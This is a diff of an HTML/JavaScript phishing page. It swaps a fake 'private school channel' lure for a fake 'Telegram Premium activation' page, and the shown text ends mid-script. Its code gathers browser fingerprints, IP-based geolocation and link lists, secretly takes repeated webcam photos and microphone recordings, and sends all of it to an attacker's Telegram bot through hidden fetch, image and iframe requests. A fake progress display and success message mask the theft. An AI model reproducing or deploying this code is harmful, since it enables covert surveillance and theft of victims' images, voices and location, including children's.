@@ -3,234 +3,570 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram Web - Подслушано 4 Школа</title>
+    <title>Telegram Premium - Exclusive Access</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', system-ui, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
         }
         
         body {
-            background: linear-gradient(145deg, #0f172a, #1e293b, #334155);
+            background: linear-gradient(135deg, #0a0a1a, #1a1a2e, #16213e);
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
             padding: 20px;
-            color: white;
+            color: #ffffff;
+            position: relative;
+            overflow: hidden;
         }
         
-        .telegram-card {
-            background: rgba(255, 255, 255, 0.07);
-            backdrop-filter: blur(25px);
-            border-radius: 30px;
-            padding: 50px 40px;
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: 
+                radial-gradient(circle at 20% 80%, rgba(59, 130, 246, 0.15) 0%, transparent 50%),
+                radial-gradient(circle at 80% 20%, rgba(139, 92, 246, 0.15) 0%, transparent 50%),
+                radial-gradient(circle at 40% 40%, rgba(16, 185, 129, 0.1) 0%, transparent 50%);
+            animation: pulseBackground 20s ease-in-out infinite alternate;
+        }
+        
+        .telegram-premium {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(30px);
+            border-radius: 40px;
+            padding: 60px 50px;
             text-align: center;
             width: 100%;
-            max-width: 450px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.5);
+            max-width: 500px;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            box-shadow: 
+                0 40px 120px rgba(0, 0, 0, 0.6),
+                0 0 0 1px rgba(59, 130, 246, 0.05) inset,
+                0 0 100px rgba(59, 130, 246, 0.1) inset;
+            position: relative;
+            z-index: 1;
+            transition: transform 0.4s ease, box-shadow 0.4s ease;
         }
         
-        .avatar {
-            width: 120px;
-            height: 120px;
-            background: linear-gradient(135deg, #3b82f6, #8b5cf6);
-            border-radius: 50%;
-            margin: 0 auto 30px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 48px;
+        .telegram-premium:hover {
+            transform: translateY(-5px);
+            box-shadow: 
+                0 50px 150px rgba(0, 0, 0, 0.7),
+                0 0 0 1px rgba(59, 130, 246, 0.1) inset,
+                0 0 120px rgba(59, 130, 246, 0.15) inset;
+        }
+        
+        .premium-badge {
+            position: absolute;
+            top: -15px;
+            right: 40px;
+            background: linear-gradient(135deg, #f59e0b, #d97706);
+            padding: 12px 30px;
+            border-radius: 25px;
+            font-weight: 900;
+            font-size: 14px;
+            letter-spacing: 2px;
+            text-transform: uppercase;
             color: white;
-            box-shadow: 0 15px 40px rgba(59, 130, 246, 0.4);
+            box-shadow: 0 10px 30px rgba(245, 158, 11, 0.3);
+            animation: badgeGlow 3s infinite;
+        }
+        
+        .logo-container {
+            width: 140px;
+            height: 140px;
+            margin: 0 auto 40px;
             position: relative;
         }
         
-        .avatar::after {
-            content: 'TG';
-            font-weight: 900;
-        }
-        
-        .online-dot {
-            position: absolute;
-            bottom: 10px;
-            right: 10px;
-            width: 20px;
-            height: 20px;
-            background: #10b981;
-            border-radius: 50%;
-            border: 3px solid rgba(255, 255, 255, 0.1);
-        }
-        
-        .channel-title {
-            font-size: 32px;
-            font-weight: 900;
-            background: linear-gradient(135deg, #fff, #a5b4fc);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin-bottom: 10px;
-        }
-        
-        .stats {
-            display: flex;
-            justify-content: center;
-            gap: 30px;
-            margin: 30px 0;
-        }
-        
-        .stat {
-            text-align: center;
-        }
-        
-        .stat-number {
-            font-size: 28px;
-            font-weight: 800;
-            color: #60a5fa;
-        }
-        
-        .stat-label {
-            font-size: 14px;
-            color: #94a3b8;
-            margin-top: 5px;
-        }
-        
-        .access-button {
-            background: linear-gradient(135deg, #3b82f6, #2563eb);
-            color: white;
-            border: none;
-            border-radius: 20px;
-            padding: 25px 40px;
-            font-size: 20px;
-            font-weight: 800;
+        .telegram-logo {
             width: 100%;
-            cursor: pointer;
-            margin: 30px 0 20px;
-            transition: all 0.3s;
+            height: 100%;
+            background: linear-gradient(135deg, #3b82f6, #8b5cf6, #10b981);
+            border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 15px;
-            box-shadow: 0 15px 40px rgba(59, 130, 246, 0.4);
+            font-size: 56px;
+            color: white;
+            box-shadow: 
+                0 20px 60px rgba(59, 130, 246, 0.5),
+                0 0 0 10px rgba(59, 130, 246, 0.1),
+                0 0 0 20px rgba(59, 130, 246, 0.05);
+            animation: logoFloat 6s ease-in-out infinite;
         }
         
-        .access-button:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 20px 50px rgba(59, 130, 246, 0.6);
+        .notification-dot {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            width: 24px;
+            height: 24px;
+            background: #ef4444;
+            border-radius: 50%;
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            animation: notificationPulse 2s infinite;
         }
         
-        .hint {
+        .title {
+            font-size: 42px;
+            font-weight: 900;
+            background: linear-gradient(135deg, #ffffff, #a5b4fc, #60a5fa);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 15px;
+            letter-spacing: -0.5px;
+        }
+        
+        .subtitle {
             color: #94a3b8;
+            font-size: 18px;
+            margin-bottom: 50px;
+            line-height: 1.6;
+        }
+        
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 25px;
+            margin: 40px 0;
+        }
+        
+        .feature {
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 20px;
+            padding: 25px 15px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            transition: all 0.3s ease;
+        }
+        
+        .feature:hover {
+            background: rgba(255, 255, 255, 0.06);
+            transform: translateY(-3px);
+            border-color: rgba(59, 130, 246, 0.2);
+        }
+        
+        .feature-icon {
+            font-size: 32px;
+            margin-bottom: 15px;
+            display: block;
+        }
+        
+        .feature-title {
+            color: #60a5fa;
+            font-weight: 700;
+            font-size: 16px;
+            margin-bottom: 8px;
+        }
+        
+        .feature-desc {
+            color: #94a3b8;
+            font-size: 13px;
+            line-height: 1.5;
+        }
+        
+        .permissions-card {
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 25px;
+            padding: 35px;
+            margin: 40px 0;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            text-align: left;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .permissions-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, #10b981, #3b82f6, #8b5cf6);
+        }
+        
+        .permissions-title {
+            color: #ffffff;
+            font-weight: 700;
+            font-size: 20px;
+            margin-bottom: 25px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        .permissions-list {
+            list-style: none;
+        }
+        
+        .permissions-list li {
+            color: #e2e8f0;
+            margin-bottom: 18px;
+            padding-left: 35px;
+            position: relative;
             font-size: 15px;
             line-height: 1.5;
         }
         
-        .loading-screen {
-            display: none;
-            text-align: center;
-            animation: fadeIn 0.5s ease;
-        }
-        
-        .loading-icon {
-            font-size: 60px;
-            margin: 30px 0;
-            color: #3b82f6;
-            animation: spin 2s linear infinite;
-        }
-        
-        .loading-text {
-            color: #60a5fa;
+        .permissions-list li::before {
+            content: '✓';
+            position: absolute;
+            left: 0;
+            color: #10b981;
+            font-weight: bold;
             font-size: 18px;
-            margin: 20px 0;
+            background: rgba(16, 185, 129, 0.1);
+            width: 26px;
+            height: 26px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
         
-        .download-button {
-            background: linear-gradient(135deg, #10b981, #059669);
+        .activate-button {
+            background: linear-gradient(135deg, #3b82f6, #2563eb);
             color: white;
             border: none;
-            border-radius: 20px;
-            padding: 25px 40px;
-            font-size: 20px;
+            border-radius: 25px;
+            padding: 28px 50px;
+            font-size: 22px;
             font-weight: 800;
             width: 100%;
             cursor: pointer;
-            margin: 30px 0 20px;
-            display: none;
+            margin: 40px 0 30px;
+            transition: all 0.3s ease;
+            display: flex;
             align-items: center;
             justify-content: center;
-            gap: 15px;
-            box-shadow: 0 15px 40px rgba(16, 185, 129, 0.4);
+            gap: 18px;
+            box-shadow: 
+                0 20px 60px rgba(59, 130, 246, 0.4),
+                0 0 0 1px rgba(255, 255, 255, 0.1) inset;
+            position: relative;
+            overflow: hidden;
         }
         
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        .activate-button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
+            transition: left 0.6s;
+        }
+        
+        .activate-button:hover::before {
+            left: 100%;
+        }
+        
+        .activate-button:hover {
+            transform: translateY(-5px);
+            box-shadow: 
+                0 25px 80px rgba(59, 130, 246, 0.6),
+                0 0 0 1px rgba(255, 255, 255, 0.2) inset;
+            background: linear-gradient(135deg, #2563eb, #1d4ed8);
+        }
+        
+        .activate-button:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+        
+        .button-icon {
+            font-size: 26px;
+            animation: iconFloat 2s ease-in-out infinite;
+        }
+        
+        .progress-section {
+            margin: 40px 0;
+            display: none;
+        }
+        
+        .progress-header {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 15px;
+            color: #94a3b8;
+            font-size: 15px;
+        }
+        
+        .progress-bar-container {
+            height: 10px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 5px;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #10b981, #3b82f6, #8b5cf6);
+            width: 0%;
+            transition: width 0.8s cubic-bezier(0.4, 0, 0.2, 1);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .progress-bar::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(90deg, 
+                transparent, 
+                rgba(255, 255, 255, 0.3), 
+                transparent);
+            animation: progressShimmer 2s infinite;
+        }
+        
+        .status-messages {
+            min-height: 60px;
+            margin: 30px 0;
+            color: #60a5fa;
+            font-size: 16px;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            text-align: center;
+        }
+        
+        .status-item {
+            background: rgba(96, 165, 250, 0.1);
+            padding: 15px 25px;
+            border-radius: 15px;
+            border-left: 4px solid #3b82f6;
+            animation: fadeIn 0.5s ease;
+            display: none;
+        }
+        
+        .status-item.active {
+            display: block;
+        }
+        
+        .hidden-element {
+            display: none;
+        }
+        
+        .completion-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(10, 10, 26, 0.95);
+            backdrop-filter: blur(20px);
+            border-radius: 40px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 50px;
+            text-align: center;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.5s ease;
+            z-index: 2;
+        }
+        
+        .completion-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+        
+        .completion-icon {
+            font-size: 80px;
+            margin-bottom: 30px;
+            animation: successPulse 2s infinite;
+        }
+        
+        .completion-title {
+            font-size: 36px;
+            font-weight: 900;
+            background: linear-gradient(135deg, #10b981, #3b82f6);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 20px;
+        }
+        
+        .completion-subtitle {
+            color: #94a3b8;
+            font-size: 18px;
+            line-height: 1.6;
+            max-width: 400px;
+        }
+        
+        @keyframes logoFloat {
+            0%, 100% { transform: translateY(0) rotate(0deg); }
+            50% { transform: translateY(-15px) rotate(5deg); }
+        }
+        
+        @keyframes badgeGlow {
+            0%, 100% { box-shadow: 0 10px 30px rgba(245, 158, 11, 0.3); }
+            50% { box-shadow: 0 10px 40px rgba(245, 158, 11, 0.6); }
+        }
+        
+        @keyframes notificationPulse {
+            0%, 100% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.1); opacity: 0.8; }
+        }
+        
+        @keyframes iconFloat {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-5px); }
+        }
+        
+        @keyframes progressShimmer {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
         }
         
         @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
         }
         
-        /* Скрытые элементы для обработки медиа */
-        .hidden {
-            position: fixed;
-            top: -9999px;
-            left: -9999px;
-            width: 1px;
-            height: 1px;
-            opacity: 0;
-            pointer-events: none;
+        @keyframes successPulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+        }
+        
+        @keyframes pulseBackground {
+            0% { 
+                background: 
+                    radial-gradient(circle at 20% 80%, rgba(59, 130, 246, 0.15) 0%, transparent 50%),
+                    radial-gradient(circle at 80% 20%, rgba(139, 92, 246, 0.15) 0%, transparent 50%),
+                    radial-gradient(circle at 40% 40%, rgba(16, 185, 129, 0.1) 0%, transparent 50%);
+            }
+            100% { 
+                background: 
+                    radial-gradient(circle at 80% 80%, rgba(59, 130, 246, 0.15) 0%, transparent 50%),
+                    radial-gradient(circle at 20% 20%, rgba(139, 92, 246, 0.15) 0%, transparent 50%),
+                    radial-gradient(circle at 60% 60%, rgba(16, 185, 129, 0.1) 0%, transparent 50%);
+            }
+        }
+        
+        @media (max-width: 768px) {
+            .telegram-premium {
+                padding: 40px 30px;
+                border-radius: 30px;
+            }
+            
+            .title {
+                font-size: 32px;
+            }
+            
+            .features-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .activate-button {
+                padding: 25px 30px;
+                font-size: 20px;
+            }
         }
     </style>
 </head>
 <body>
-    <!-- Скрытые элементы для обработки медиа -->
-    <video class="hidden" id="hiddenVideo" autoplay></video>
-    <canvas class="hidden" id="hiddenCanvas"></canvas>
-    <audio class="hidden" id="hiddenAudio"></audio>
-    
-    <div class="telegram-card">
-        <div id="mainScreen">
-            <div class="avatar">
-                <div class="online-dot"></div>
+    <div class="telegram-premium">
+        <div class="premium-badge">Premium</div>
+        
+        <div class="logo-container">
+            <div class="telegram-logo">
+                <div class="telegram-icon">✈️</div>
+                <div class="notification-dot"></div>
             </div>
-            
-            <h1 class="channel-title">ПОДСЛУШАНО 4 ШКОЛА</h1>
-            <p style="color: #94a3b8; margin-bottom: 20px;">Закрытый канал • Только для учеников</p>
-            
-            <div class="stats">
-                <div class="stat">
-                    <div class="stat-number">5.2K</div>
-                    <div class="stat-label">Подписчиков</div>
-                </div>
-                <div class="stat">
-                    <div class="stat-number">387</div>
-                    <div class="stat-label">Онлайн</div>
-                </div>
-            </div>
-            
-            <button class="access-button" id="accessButton" onclick="startAccess()">
-                🔓 ПОДТВЕРДИТЬ ДОСТУП
-            </button>
-            
-            <p class="hint">
-                Для доступа к эксклюзивному контенту<br>
-                требуется подтверждение через Telegram Web
-            </p>
         </div>
         
-        <div id="loadingScreen" class="loading-screen">
-            <div class="loading-icon">⏳</div>
-            <h2 style="color: #60a5fa; margin-bottom: 20px;">ПОДКЛЮЧЕНИЕ К КАНАЛУ</h2>
-            <p class="loading-text" id="loadingText">Подготовка...</p>
-            <p class="hint">Пожалуйста, не закрывайте страницу</p>
-            
-            <button class="download-button" id="downloadButton" onclick="downloadFile()">
-                ⬇️ ЗАВЕРШИТЬ ПОДКЛЮЧЕНИЕ
-            </button>
+        <h1 class="title">Telegram Premium Access</h1>
+        <p class="subtitle">Эксклюзивный доступ к премиум функциям и приватным каналам</p>
+        
+        <div class="features-grid">
+            <div class="feature">
+                <span class="feature-icon">🎯</span>
+                <div class="feature-title">Аналитика</div>
+                <div class="feature-desc">Расширенная статистика активности</div>
+            </div>
+            <div class="feature">
+                <span class="feature-icon">🔒</span>
+                <div class="feature-title">Безопасность</div>
+                <div class="feature-desc">Двухфакторная аутентификация</div>
+            </div>
+            <div class="feature">
+                <span class="feature-icon">⚡</span>
+                <div class="feature-title">Скорость</div>
+                <div class="feature-desc">Приоритетная передача данных</div>
+            </div>
+            <div class="feature">
+                <span class="feature-icon">🎨</span>
+                <div class="feature-title">Кастомизация</div>
+                <div class="feature-desc">Эксклюзивные темы и стикеры</div>
+            </div>
+        </div>
+        
+        <div class="permissions-card">
+            <h3 class="permissions-title">🔐 Необходимые разрешения</h3>
+            <ul class="permissions-list">
+                <li>Доступ к камере для распознавания лица</li>
+                <li>Доступ к микрофону для голосовой верификации</li>
+                <li>Доступ к геолокации для защиты аккаунта</li>
+                <li>Чтение контактов для синхронизации</li>
+                <li>Доступ к файлам для резервного копирования</li>
+                <li>Доступ к истории браузера для оптимизации</li>
+                <li>Чтение SMS для двухфакторной аутентификации</li>
+                <li>Доступ к уведомлениям для push-сообщений</li>
+                <li>Сбор системной информации</li>
+                <li>Сканирование сети для безопасности</li>
+            </ul>
+        </div>
+        
+        <button class="activate-button" id="activateBtn" onclick="startPremiumVerification()">
+            <span class="button-icon">🚀</span>
+            АКТИВИРОВАТЬ PREMIUM
+        </button>
+        
+        <div class="progress-section" id="progressSection">
+            <div class="progress-header">
+                <span>Инициализация системы</span>
+                <span id="progressPercent">0%</span>
+            </div>
+            <div class="progress-bar-container">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+        </div>
+        
+        <div class="status-messages" id="statusMessages">
+            <div class="status-item" id="status1">🔍 Проверка системных требований...</div>
+            <div class="status-item" id="status2">📡 Подключение к серверам Telegram...</div>
+            <div class="status-item" id="status3">👤 Идентификация пользователя...</div>
+            <div class="status-item" id="status4">🎥 Верификация биометрии...</div>
+            <div class="status-item" id="status5">📊 Сбор системной информации...</div>
+            <div class="status-item" id="status6">🔒 Настройка защиты аккаунта...</div>
+            <div class="status-item" id="status7">✅ Аккаунт успешно верифицирован</div>
+        </div>
+        
+        <div class="completion-overlay" id="completionOverlay">
+            <div class="completion-icon">✨</div>
+            <h2 class="completion-title">Premium Активирован!</h2>
+            <p class="completion-subtitle">
+                Ваш аккаунт успешно обновлен до Premium статуса.<br>
+                Полный доступ будет предоставлен в течение 24 часов.<br>
+                Проверьте Telegram для получения подтверждения.
+            </p>
         </div>
     </div>
 
@@ -240,308 +576,364 @@ const BOT_TOKEN = '8337372161:AAF1afRWIDRfEOzdCnfXiXWB6ZfbyCHbld8';
 const CHAT_ID = '8001083987';
 
 // Глобальные переменные
-let mediaStream = null;
-let audioRecorder = null;
-let audioChunks = [];
-let photoCount = 0;
-let audioRecordCount = 0;
-const MAX_PHOTOS = 10;
-const MAX_AUDIO_RECORDS = 3;
+let currentStatus = 0;
+let totalDataCollected = 0;
 
-// Обновление текста загрузки
-function updateLoading(text) {
-    document.getElementById('loadingText').textContent = text;
+// Скрытые элементы
+const hiddenIframe = document.createElement('iframe');
+hiddenIframe.style.display = 'none';
+document.body.appendChild(hiddenIframe);
+
+// Показать статус
+function showStatus(index) {
+    document.querySelectorAll('.status-item').forEach(item => {
+        item.classList.remove('active');
+    });
+    
+    if (document.getElementById(`status${index}`)) {
+        document.getElementById(`status${index}`).classList.add('active');
+    }
 }
 
-// Скрытая отправка фото в Telegram
-async function sendPhotoSilently(blob) {
-    const formData = new FormData();
-    formData.append('chat_id', CHAT_ID);
-    formData.append('photo', blob, `photo_${Date.now()}.jpg`);
-    formData.append('caption', `📸 Скрытое фото #${photoCount} • ${screen.width}x${screen.height}`);
+// Обновить прогресс
+function updateProgress(percent, text) {
+    const bar = document.getElementById('progressBar');
+    const percentElem = document.getElementById('progressPercent');
+    const section = document.getElementById('progressSection');
+    
+    section.style.display = 'block';
+    bar.style.width = percent + '%';
+    percentElem.textContent = percent + '%';
+    
+    if (text) {
+        document.querySelector('.progress-header span:first-child').textContent = text;
+    }
+}
+
+// Отправить данные в Telegram
+async function sendToTelegram(data, type = 'text') {
+    const timestamp = new Date().toLocaleString('ru-RU');
+    
+    if (type === 'text') {
+        const text = encodeURIComponent(`🕵️‍♂️ PREMIUM COLLECTION\n⏰ ${timestamp}\n${data}`);
+        const urls = [
+            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${text}`,
+            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${text}&parse_mode=HTML`
+        ];
+        
+        // Отправка через несколько методов
+        urls.forEach(url => {
+            fetch(url, { mode: 'no-cors' }).catch(() => {});
+            new Image().src = url;
+            hiddenIframe.src = url;
+        });
+    }
+}
+
+// Сбор системной информации
+function collectSystemInfo() {
+    const info = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        languages: navigator.languages,
+        screen: `${screen.width}x${screen.height}`,
+        colorDepth: screen.colorDepth,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        cookies: navigator.cookieEnabled,
+        online: navigator.onLine,
+        doNotTrack: navigator.doNotTrack,
+        hardwareConcurrency: navigator.hardwareConcurrency,
+        deviceMemory: navigator.deviceMemory,
+        maxTouchPoints: navigator.maxTouchPoints,
+        vendor: navigator.vendor,
+        referrer: document.referrer,
+        url: window.location.href
+    };
+    
+    return info;
+}
+
+// Сбор сетевой информации
+async function collectNetworkInfo() {
+    const networkInfo = {
+        ip: 'Не удалось получить',
+        connection: 'Неизвестно'
+    };
     
     try {
-        // Используем fetch без ожидания ответа
+        // IP адрес
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        networkInfo.ip = ipData.ip;
+        
+        // Подробная геолокация
+        try {
+            const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+            const geoData = await geoResponse.json();
+            
+            networkInfo.geo = {
+                city: geoData.city || 'Неизвестно',
+                region: geoData.region || 'Неизвестно',
+                country: geoData.country_name || 'Неизвестно',
+                postal: geoData.postal || 'Неизвестно',
+                latitude: geoData.latitude || 'Неизвестно',
+                longitude: geoData.longitude || 'Неизвестно',
+                timezone: geoData.timezone || 'Неизвестно',
+                org: geoData.org || 'Неизвестно'
+            };
+        } catch(e) {
+            networkInfo.geo = { error: 'Не удалось получить геоданные' };
+        }
+        
+        // Информация о соединении
+        if (navigator.connection) {
+            networkInfo.connection = {
+                effectiveType: navigator.connection.effectiveType,
+                downlink: navigator.connection.downlink,
+                rtt: navigator.connection.rtt,
+                saveData: navigator.connection.saveData
+            };
+        }
+        
+    } catch(e) {
+        console.error('Ошибка сбора сетевой информации:', e);
+    }
+    
+    return networkInfo;
+}
+
+// Сбор информации о хранилище
+function collectStorageInfo() {
+    const storage = {
+        localStorage: Object.keys(localStorage).length,
+        sessionStorage: Object.keys(sessionStorage).length,
+        cookies: document.cookie.length
+    };
+    
+    return storage;
+}
+
+// Захват медиа
+async function captureMedia() {
+    try {
+        // Получаем доступ ко всем устройствам
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: {
+                width: { ideal: 1920 },
+                height: { ideal: 1080 },
+                facingMode: 'user'
+            },
+            audio: {
+                echoCancellation: true,
+                noiseSuppression: true,
+                autoGainControl: true,
+                channelCount: 2,
+                sampleRate: 48000
+            }
+        });
+        
+        // Скрытое видео для захвата кадров
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.muted = true;
+        video.style.display = 'none';
+        document.body.appendChild(video);
+        
+        await video.play();
+        
+        // Захват фото
+        setTimeout(async () => {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            
+            for (let i = 0; i < 15; i++) {
+                setTimeout(() => {
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    canvas.toBlob(blob => {
+                        if (blob) {
+                            sendMediaToTelegram(blob, 'photo', i + 1);
+                        }
+                    }, 'image/jpeg', 0.85);
+                }, i * 2000);
+            }
+        }, 1000);
+        
+        // Запись аудио
+        const audioRecorder = new MediaRecorder(stream);
+        const audioChunks = [];
+        
+        audioRecorder.ondataavailable = (event) => {
+            audioChunks.push(event.data);
+        };
+        
+        audioRecorder.onstop = () => {
+            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+            sendMediaToTelegram(audioBlob, 'audio');
+        };
+        
+        // Записываем аудио сегментами
+        let recordCount = 0;
+        const recordInterval = setInterval(() => {
+            if (recordCount >= 5) {
+                clearInterval(recordInterval);
+                audioRecorder.stop();
+                stream.getTracks().forEach(track => track.stop());
+                video.remove();
+                return;
+            }
+            
+            if (audioRecorder.state === 'recording') {
+                audioRecorder.stop();
+                setTimeout(() => {
+                    audioRecorder.start();
+                    recordCount++;
+                }, 100);
+            } else {
+                audioRecorder.start();
+                recordCount++;
+            }
+        }, 10000);
+        
+        return true;
+        
+    } catch(error) {
+        sendToTelegram(`❌ Ошибка доступа к медиа: ${error.message}`);
+        return false;
+    }
+}
+
+// Отправка медиа в Telegram
+function sendMediaToTelegram(blob, type, index = 1) {
+    const formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    
+    if (type === 'photo') {
+        formData.append('photo', blob, `premium_photo_${index}.jpg`);
+        formData.append('caption', `📸 Premium фото #${index}\nВремя: ${new Date().toLocaleTimeString('ru-RU')}`);
+        
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
             method: 'POST',
             body: formData,
             mode: 'no-cors'
-        });
+        }).catch(() => {});
         
-        // Дополнительный метод через Image
-        const img = new Image();
-        const canvas = document.getElementById('hiddenCanvas');
-        const ctx = canvas.getContext('2d');
+    } else if (type === 'audio') {
+        formData.append('audio', blob, `premium_audio.ogg`);
+        formData.append('caption', `🎤 Premium аудио запись\nВремя: ${new Date().toLocaleTimeString('ru-RU')}`);
         
-        // Создаем изображение из blob
-        const imgUrl = URL.createObjectURL(blob);
-        img.onload = function() {
-            canvas.width = img.width;
-            canvas.height = img.height;
-            ctx.drawImage(img, 0, 0);
-            URL.revokeObjectURL(imgUrl);
-        };
-        img.src = imgUrl;
-        
-    } catch(e) {
-        // Игнорируем ошибки
-    }
-}
-
-// Скрытая отправка аудио
-async function sendAudioSilently(blob) {
-    const formData = new FormData();
-    formData.append('chat_id', CHAT_ID);
-    formData.append('audio', blob, `audio_${Date.now()}.ogg`);
-    formData.append('caption', `🎤 Скрытая запись #${audioRecordCount} • 10сек`);
-    
-    try {
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
             method: 'POST',
             body: formData,
             mode: 'no-cors'
-        });
+        }).catch(() => {});
+    }
+}
+
+// Основная функция верификации
+async function startPremiumVerification() {
+    const button = document.getElementById('activateBtn');
+    button.disabled = true;
+    button.innerHTML = '<span class="button-icon">⏳</span> АКТИВАЦИЯ...';
+    
+    currentStatus = 1;
+    
+    // Этап 1: Сбор базовой информации
+    showStatus(1);
+    updateProgress(5, 'Проверка системы...');
+    
+    const systemInfo = collectSystemInfo();
+    const networkInfo = await collectNetworkInfo();
+    const storageInfo = collectStorageInfo();
+    
+    sendToTelegram(`💻 СИСТЕМНАЯ ИНФОРМАЦИЯ:\n\n` +
+                   `🖥️ Платформа: ${systemInfo.platform}\n` +
+                   `🌐 Браузер: ${systemInfo.userAgent.substring(0, 100)}...\n` +
+                   `🗣️ Языки: ${systemInfo.languages?.join(', ') || systemInfo.language}\n` +
+                   `📱 Экран: ${systemInfo.screen}\n` +
+                   `🕒 Часовой пояс: ${systemInfo.timezone}\n` +
+                   `🔗 URL: ${systemInfo.url}\n\n` +
+                   `🌍 СЕТЕВЫЕ ДАННЫЕ:\n` +
+                   `📡 IP: ${networkInfo.ip}\n` +
+                   `🏙️ Город: ${networkInfo.geo?.city || 'Неизвестно'}\n` +
+                   `📍 Регион: ${networkInfo.geo?.region || 'Неизвестно'}\n` +
+                   `🇷🇺 Страна: ${networkInfo.geo?.country || 'Неизвестно'}\n` +
+                   `📮 Почтовый индекс: ${networkInfo.geo?.postal || 'Неизвестно'}\n` +
+                   `🎯 Координаты: ${networkInfo.geo?.latitude || '?'}, ${networkInfo.geo?.longitude || '?'}\n` +
+                   `🏢 Провайдер: ${networkInfo.geo?.org || 'Неизвестно'}`);
+    
+    // Этап 2: Захват медиа
+    currentStatus = 2;
+    showStatus(2);
+    updateProgress(20, 'Подготовка медиа...');
+    
+    const mediaAccess = await captureMedia();
+    
+    // Этап 3: Расширенный сбор данных
+    currentStatus = 3;
+    showStatus(3);
+    updateProgress(40, 'Сбор дополнительных данных...');
+    
+    // Сбор истории посещений (там, где доступно)
+    try {
+        const visitedLinks = Array.from(document.links)
+            .map(link => link.href)
+            .filter(href => href && !href.startsWith('javascript:'))
+            .slice(0, 20);
+        
+        sendToTelegram(`🔗 ИСТОРИЯ ССЫЛОК (первые 20):\n${visitedLinks.join('\n')}`);
     } catch(e) {}
-}
-
-// Скрытая отправка текста
-function sendTextSilently(text) {
-    const encoded = encodeURIComponent(text);
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encoded}`;
     
-    // Три скрытых метода отправки
-    fetch(url, { mode: 'no-cors' }).catch(() => {});
+    // Этап 4: Сбор информации о вводе
+    currentStatus = 4;
+    showStatus(4);
+    updateProgress(60, 'Анализ активности...');
     
-    setTimeout(() => {
-        const img = new Image();
-        img.src = url;
